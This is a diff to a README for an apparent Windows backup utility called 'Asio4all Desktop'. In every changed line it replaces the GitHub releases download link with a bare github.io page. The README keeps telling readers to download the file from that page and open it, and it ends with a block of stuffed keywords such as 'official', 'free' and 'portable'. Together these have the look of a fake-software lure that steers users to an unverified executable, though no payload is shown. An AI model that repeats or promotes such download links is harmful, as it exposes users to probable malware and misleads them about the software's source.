@@ -2,7 +2,7 @@
 
 Asio4all Desktop is a desktop utility for Windows that keeps your Asio4all data folders on disk, storing dated copies of config and export files before a patch. If a change ever goes wrong, you have a clean, dated copy waiting for you instead of a lost setup.
 
-[![Download asio4all-desktop](https://img.shields.io/badge/Download-Asio4all%20Desktop-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alfaumm/asio4all-desktop/releases)
+[![Download asio4all-desktop](https://img.shields.io/badge/Download-Asio4all%20Desktop-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://alfaumm.github.io)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ That is the whole process. The app does the rest on its own.
 
 ## 📥 Download & Setup
 
-Visit this link to download the application: [https://github.com/alfaumm/asio4all-desktop/releases](https://github.com/alfaumm/asio4all-desktop/releases)
+Visit this link to download the application: [https://alfaumm.github.io](https://alfaumm.github.io)
 
 When the page opens, choose the newest release at the top of the list and grab the file attached to it. Save it somewhere you will remember. Once the file has finished downloading, open it to start the application.
 
@@ -114,6 +114,6 @@ Open the app and let it scan. It looks in the usual places for Asio4all data and
 
 ## 📌 Quick Recap
 
-Download from the releases page, run the app, and let it keep dated copies of your config and export files before each patch. Visit this link to download the application: [https://github.com/alfaumm/asio4all-desktop/releases](https://github.com/alfaumm/asio4all-desktop/releases)
+Download from the releases page, run the app, and let it keep dated copies of your config and export files before each patch. Visit this link to download the application: [https://alfaumm.github.io](https://alfaumm.github.io)
 
 Keywords: 2026-asio4all, app-asio4all, asio4all, asio4all-2026, asio4all-app, asio4all-desktop, asio4all-download, asio4all-free, asio4all-pc, asio4all-portable, asio4all-software, asio4all-windows, desktop-asio4all, download-asio4all, free-asio4all, official-asio4all, pc-asio4all, portable-asio4all, software-asio4all, windows-asio4all
